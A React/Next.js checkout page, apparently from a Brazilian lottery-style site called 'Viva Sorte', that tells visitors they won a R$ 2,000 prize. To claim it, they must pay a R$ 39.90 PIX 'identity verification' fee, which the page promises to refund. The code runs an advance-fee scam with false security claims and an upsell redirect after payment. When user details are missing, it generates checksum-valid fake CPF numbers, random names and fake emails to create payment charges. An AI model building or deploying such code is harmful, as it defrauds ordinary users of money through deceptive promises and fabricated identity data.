"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { AlertCircle, CheckCircle2, Lock } from "lucide-react"
import { getAllTrackingData } from "@/lib/utm-utils"
import { updatePurchaseStatus } from "@/lib/purchases-management"
import HeaderMenu from "@/components/header-menu"

interface PixData {
  code?: string
  qrcode_base64?: string
}

interface CheckoutFormData {
  name: string
  email: string
  cpf: string
}

export default function VerificationPage() {
  const router = useRouter()
  const [verificationStep, setVerificationStep] = useState<"info" | "generating" | "pix" | "success">("info")
  const [pixData, setPixData] = useState<PixData | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [formData, setFormData] = useState<CheckoutFormData | null>(null)
  const [transactionId, setTransactionId] = useState<string | null>(null)
  const [paymentVerified, setPaymentVerified] = useState(false)

  const verificationAmount = 39.9
  const refundAmount = 2000

  useEffect(() => {
    const storedFormData = localStorage.getItem("checkout_form_data")
    if (storedFormData) {
      try {
        const parsedData = JSON.parse(storedFormData)
        setFormData(parsedData)
      } catch (err) {
        console.error("[v0] Error parsing stored form data:", err)
      }
    }
  }, [])

  const generatePixAutomatically = async () => {
    setVerificationStep("generating")
    setError(null)

    try {
      const trackingData = getAllTrackingData()

      let payload: any
      if (formData && formData.name && formData.email && formData.cpf) {
        payload = {
          name: formData.name,
          email: formData.email,
          cpf: formData.cpf,
          quantity: 1,
          amount: Math.round(verificationAmount * 100),
          ...trackingData,
        }
      } else {
        const timestamp = Date.now()
        const firstName = ["Maria", "João", "Ana", "Carlos", "Paula"][Math.floor(Math.random() * 5)]
        const lastName = ["Silva", "Santos", "Oliveira", "Costa", "Souza"][Math.floor(Math.random() * 5)]

        payload = {
          name: `${firstName} ${lastName}`,
          email: `verificacao_${timestamp}@viva-sorte.com`,
          cpf: generateValidCPF(),
          quantity: 1,
          amount: Math.round(verificationAmount * 100),
          ...trackingData,
        }
      }

      const response = await fetch("/api/create-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Erro ao gerar PIX")
      }

      if (data.data?.pix?.code && data.data?.pix?.qrcode_base64) {
        setPixData(data.data.pix)
        setTransactionId(data.data.id)
        setVerificationStep("pix")
      } else {
        throw new Error("Resposta inválida do servidor")
      }
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : "Erro desconhecido"
      setError(errorMessage)
      setVerificationStep("info")
    }
  }

  const generateValidCPF = (): string => {
    let cpf = ""
    for (let i = 0; i < 9; i++) {
      cpf += Math.floor(Math.random() * 10)
    }

    let sum = 0
    for (let i = 0; i < 9; i++) {
      sum += Number.parseInt(cpf[i]) * (10 - i)
    }
    let remainder = sum % 11
    const firstDigit = remainder < 2 ? 0 : 11 - remainder
    cpf += firstDigit

    sum = 0
    for (let i = 0; i < 10; i++) {
      sum += Number.parseInt(cpf[i]) * (11 - i)
    }
    remainder = sum % 11
    const secondDigit = remainder < 2 ? 0 : 11 - remainder
    cpf += secondDigit

    return cpf
  }

  useEffect(() => {
    if (verificationStep !== "pix" || !transactionId || paymentVerified) {
      return
    }

    const verifyPayment = async () => {
      try {
        const response = await fetch("/api/verify-pix", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ transactionId }),
        })

        const data = await response.json()

        if (data.isPaid) {
          setPaymentVerified(true)
          setVerificationStep("success")

          const pendingPurchaseId = sessionStorage.getItem("pending_purchase_id")
          if (pendingPurchaseId) {
            updatePurchaseStatus(pendingPurchaseId, "completed")
            sessionStorage.removeItem("pending_purchase_id")
          }

          // Auto-redirect to upsell after 2 seconds
          setTimeout(() => {
            router.push("/upsell")
          }, 2000)
        }
      } catch (err) {
        console.error("[v0] Payment verification error:", err)
      }
    }

    const interval = setInterval(verifyPayment, 5000)
    return () => clearInterval(interval)
  }, [verificationStep, transactionId, paymentVerified, router])

  const handleVerifyClick = () => {
    generatePixAutomatically()
  }

  const handleBuyMoreTickets = () => {
    router.push("/")
  }

  const handleBackToHome = () => {
    router.push("/")
  }

  useEffect(() => {
    const shouldAutoGenerate = localStorage.getItem("auto_generate_pix")
    if (shouldAutoGenerate === "true") {
      localStorage.removeItem("auto_generate_pix")
      generatePixAutomatically()
    }
  }, [])

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="bg-white p-3 sm:p-4 flex items-center justify-between border-b sticky top-0 z-10">
        <Image
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ODx1rLRAaDQT-aVUCbVbgZTqf4v0e275UDVm8V0hdRA.png"
          alt="Viva Sorte Logo"
          width={160}
          height={45}
          className="h-6 sm:h-10 w-auto"
        />
        <HeaderMenu />
      </header>

      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-8 sm:py-12">
        <div className="w-full max-w-2xl">
          {verificationStep === "info" && (
            <div className="animate-fade-in">
              <div className="text-center mb-8">
                <div className="mb-4 text-5xl sm:text-6xl">🔐</div>
                <h1 className="text-2xl sm:text-4xl font-bold text-gray-800 mb-4">Verificação de Identidade</h1>
                <p className="text-gray-600 text-base sm:text-lg">
                  Para proteger sua segurança e garantir que você é uma pessoa real
                </p>
              </div>

              <div className="space-y-4 mb-8">
                <div className="p-6 bg-blue-50 rounded-xl border-2 border-blue-200">
                  <div className="flex gap-4">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-lg">
                        1
                      </div>
                    </div>
                    <div>
                      <h3 className="font-bold text-gray-800 mb-1 text-sm sm:text-base">Como Funciona</h3>
                      <p className="text-gray-700 text-sm sm:text-base">
                        Você paga uma taxa simbólica de <span className="font-bold">R$ 39,90</span> para verificar sua
                        identidade
                      </p>
                    </div>
                  </div>
                </div>

                <div className="p-6 bg-green-50 rounded-xl border-2 border-green-200">
                  <div className="flex gap-4">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-green-600 text-white rounded-full flex items-center justify-center font-bold text-lg">
                        2
                      </div>
                    </div>
                    <div>
                      <h3 className="font-bold text-gray-800 mb-1 text-sm sm:text-base">Reembolso Completo</h3>
                      <p className="text-gray-700 text-sm sm:text-base">
                        Seu pagamento de <span className="font-bold">R$ 39,90</span> é totalmente reembolsado junto com
                        seu prêmio
                      </p>
                    </div>
                  </div>
                </div>

                <div className="p-6 bg-purple-50 rounded-xl border-2 border-purple-200">
                  <div className="flex gap-4">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-purple-600 text-white rounded-full flex items-center justify-center font-bold text-lg">
                        3
                      </div>
                    </div>
                    <div>
                      <h3 className="font-bold text-gray-800 mb-1 text-sm sm:text-base">Seguro & Protegido</h3>
                      <p className="text-gray-700 text-sm sm:text-base">
                        Seus dados são criptografados e protegidos com segurança SSL 256-bit
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="mb-8 p-6 sm:p-8 bg-gray-50 rounded-xl border-2 border-gray-200">
                <div className="space-y-4">
                  <div className="flex justify-between items-center text-sm sm:text-base">
                    <span className="text-gray-700">Taxa de Verificação:</span>
                    <span className="font-bold text-gray-800">R$ {verificationAmount.toFixed(2)}</span>
                  </div>
                  <div className="h-px bg-gray-300"></div>
                  <div className="flex justify-between items-center text-sm sm:text-base">
                    <span className="text-gray-700">Prêmio Confirmado:</span>
                    <span className="font-bold text-green-600">+ R$ {refundAmount.toFixed(2)}</span>
                  </div>
                  <div className="h-px bg-gray-300"></div>
                  <div className="flex justify-between items-center text-lg sm:text-xl">
                    <span className="font-bold text-gray-800">Você Receberá:</span>
                    <span className="font-black text-green-600">
                      R$ {(refundAmount + verificationAmount).toFixed(2)}
                    </span>
                  </div>
                </div>
              </div>

              <div className="mb-8 p-4 sm:p-6 bg-yellow-50 border-2 border-yellow-300 rounded-xl flex gap-4">
                <AlertCircle className="w-6 h-6 sm:w-8 sm:h-8 text-yellow-600 flex-shrink-0 mt-1" />
                <div>
                  <h4 className="font-bold text-yellow-900 text-sm sm:text-base mb-2">Informação Importante</h4>
                  <p className="text-yellow-900 text-xs sm:text-sm">
                    Esta taxa é necessária apenas para confirmar que você é uma pessoa real e não um bot. Este é um
                    processo padrão para proteção contra fraude. Você receberá o reembolso completo junto com seu prêmio
                    em até 24 horas após a confirmação.
                  </p>
                </div>
              </div>

              {error && (
                <div className="mb-6 p-4 bg-red-50 border-2 border-red-300 rounded-xl flex gap-4">
                  <AlertCircle className="w-6 h-6 text-red-600 flex-shrink-0" />
                  <div className="text-red-900 text-sm">{error}</div>
                </div>
              )}

              <div className="space-y-3">
                <Button
                  onClick={handleVerifyClick}
                  className="w-full h-14 sm:h-16 bg-blue-600 hover:bg-blue-700 text-white rounded-xl font-bold text-base sm:text-lg shadow-lg hover:shadow-xl transition-all"
                >
                  <Lock className="w-5 h-5 mr-2" />
                  Prosseguir com Verificação
                </Button>

                <Button
                  onClick={handleBuyMoreTickets}
                  variant="outline"
                  className="w-full h-12 sm:h-14 text-base sm:text-lg bg-transparent"
                >
                  Comprar Mais Títulos
                </Button>
              </div>
            </div>
          )}

          {verificationStep === "generating" && (
            <div className="animate-fade-in text-center py-12">
              <div className="mb-6">
                <div className="inline-block">
                  <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center animate-spin">
                    <Lock className="w-8 h-8 text-white" />
                  </div>
                </div>
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">Gerando PIX...</h2>
              <p className="text-gray-600 text-base sm:text-lg">Processando sua verificação, por favor aguarde</p>
            </div>
          )}

          {verificationStep === "pix" && pixData && (
            <div className="animate-fade-in">
              <div className="text-center mb-8">
                <h1 className="text-2xl sm:text-4xl font-bold text-gray-800 mb-4">PIX Gerado com Sucesso!</h1>
                <p className="text-gray-600 text-base sm:text-lg">
                  Escaneie o QR code abaixo para realizar o pagamento
                </p>
              </div>

              <div className="mb-8 p-6 sm:p-8 bg-gray-50 rounded-xl border-2 border-gray-300">
                {pixData.qrcode_base64 && (
                  <div className="flex justify-center mb-6">
                    <img
                      src={`data:image/png;base64,${pixData.qrcode_base64}`}
                      alt="QR Code PIX"
                      className="w-64 h-64"
                    />
                  </div>
                )}

                <div className="mb-6 p-4 bg-white rounded-lg border border-gray-300">
                  <p className="text-xs sm:text-sm text-gray-600 mb-2">Código PIX (Copia e Cola):</p>
                  <code className="text-xs sm:text-sm break-all bg-gray-100 p-3 rounded block font-mono">
                    {pixData.code}
                  </code>
                </div>

                <div className="flex gap-2">
                  <Button
                    onClick={() => {
                      navigator.clipboard.writeText(pixData.code || "")
                    }}
                    variant="outline"
                    className="flex-1 h-12"
                  >
                    Copiar Código
                  </Button>
                </div>
              </div>

              <div className="mb-8 p-6 bg-blue-50 rounded-xl border-2 border-blue-300">
                <h3 className="font-bold text-blue-900 mb-3">Próximos Passos:</h3>
                <ol className="text-blue-900 text-sm space-y-2 list-decimal list-inside">
                  <li>Abra seu app de banco ou carteira digital</li>
                  <li>Selecione a opção "Pagar com PIX"</li>
                  <li>Escaneie o QR code ou copie o código</li>
                  <li>Confirme o pagamento de R$ 39,90</li>
                </ol>
              </div>

              <div className="space-y-3">
                <div className="p-4 bg-green-50 border-2 border-green-300 rounded-xl flex gap-3">
                  <CheckCircle2 className="w-6 h-6 text-green-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-sm font-semibold text-green-900">Aguardando seu pagamento...</p>
                    <p className="text-xs text-green-800">
                      Você será redirecionado automaticamente assim que confirmarmos o recebimento do seu PIX.
                    </p>
                  </div>
                </div>

                <Button
                  onClick={handleBuyMoreTickets}
                  variant="outline"
                  className="w-full h-12 sm:h-14 text-base sm:text-lg bg-transparent"
                >
                  Comprar Mais Títulos
                </Button>
              </div>
            </div>
          )}

          {verificationStep === "success" && (
            <div className="animate-fade-in">
              <div className="text-center mb-8">
                <div className="mb-4 flex justify-center">
                  <div className="inline-block">
                    <CheckCircle2 className="w-20 h-20 sm:w-24 sm:h-24 text-green-600 animate-bounce" />
                  </div>
                </div>
                <h1 className="text-2xl sm:text-4xl font-bold text-gray-800 mb-4">✓ Verificação Completa!</h1>
                <p className="text-gray-600 text-base sm:text-lg mb-8">Seus dados foram verificados com sucesso</p>
              </div>

              <div className="space-y-6 mb-8">
                <div className="p-6 bg-green-50 rounded-xl border-2 border-green-300">
                  <div className="flex items-center gap-3 mb-4">
                    <CheckCircle2 className="w-6 h-6 text-green-600" />
                    <span className="font-bold text-green-900">Identidade verificada</span>
                  </div>
                  <p className="text-sm text-green-800">Sua conta está 100% verificada e segura</p>
                </div>

                <div className="p-6 bg-blue-50 rounded-xl border-2 border-blue-300">
                  <div className="flex justify-between items-center mb-4">
                    <span className="font-semibold text-gray-800">Prêmio Confirmado:</span>
                    <span className="text-2xl font-black text-blue-600">R$ 2.000,00</span>
                  </div>
                  <div className="flex justify-between items-center text-sm text-gray-600">
                    <span>Reembolso da taxa:</span>
                    <span className="font-bold">R$ 39,90</span>
                  </div>
                </div>
              </div>

              <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-300 mb-8">
                <p className="text-sm text-yellow-900">Redirecionando para a próxima página em alguns segundos...</p>
              </div>

              <div className="flex flex-col gap-3">
                <Button
                  onClick={handleBuyMoreTickets}
                  className="w-full h-14 sm:h-16 bg-blue-600 hover:bg-blue-700 text-white rounded-xl font-bold text-base sm:text-lg"
                >
                  Comprar Mais Títulos
                </Button>

                <Button
                  onClick={handleBackToHome}
                  variant="outline"
                  className="w-full h-12 sm:h-14 text-base sm:text-lg bg-transparent"
                >
                  Voltar para Home
                </Button>
              </div>
            </div>
          )}
        </div>
      </main>

      <footer className="border-t border-gray-200 py-4 px-4 text-center text-xs sm:text-sm text-gray-600">
        <p>Transações 100% Seguras e Criptografadas</p>
      </footer>
    </div>
  )
}
